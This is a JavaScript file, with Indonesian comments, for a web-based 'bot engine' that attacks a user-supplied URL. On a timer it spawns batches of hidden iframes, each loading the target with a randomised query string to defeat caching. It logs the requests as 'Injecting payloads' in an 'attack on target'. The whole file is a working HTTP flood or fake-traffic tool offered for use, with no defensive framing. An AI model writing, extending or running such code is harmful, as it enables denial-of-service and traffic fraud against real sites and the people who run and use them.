let isRunning = false;
let count = 0;
let botInterval;

function addLog(msg) {
    const box = document.getElementById('logBox');
    const time = new Date().toLocaleTimeString();
    box.innerHTML += `<div>[${time}] ${msg}</div>`;
    box.scrollTop = box.scrollHeight;
}

function toggleBot() {
    const btn = document.getElementById('mainBtn');
    const stats = document.getElementById('statsPanel');
    const url = document.getElementById('targetUrl').value;
    const interval = document.getElementById('intervalTime').value * 1000;
    const threads = document.getElementById('threads').value;

    if (!isRunning) {
        if (!url.startsWith('http')) return alert("Gunakan http:// atau https://");
        
        isRunning = true;
        btn.innerText = "Terminate Engine";
        btn.className = "btn stop";
        
        // MUNCULKAN PANEL STATS
        stats.style.display = "block";
        
        addLog("Initializing attack on target...");

        botInterval = setInterval(() => {
            for (let i = 0; i < threads; i++) {
                const ifr = document.createElement('iframe');
                ifr.style.display = 'none';
                ifr.src = url + "?v=" + Math.random();
                document.body.appendChild(ifr);
                setTimeout(() => ifr.remove(), 2000);
            }
            count += parseInt(threads);
            document.getElementById('countDisplay').innerText = count;
            addLog(`Injecting ${threads} payloads... SUCCESS`);
        }, interval);
    } else {
        isRunning = false;
        btn.innerText = "Execute Engine";
        btn.className = "btn start";
        
        // SEMBUNYIKAN PANEL STATS LAGI (Optional, kalau mau tetap kelihatan hapus baris bawah ini)
        // stats.style.display = "none";
        
        document.getElementById('statusText').innerText = "STOPPED";
        document.getElementById('statusText').style.color = "var(--danger)";
        clearInterval(botInterval);
        addLog("Process terminated by operator.");
    }
}
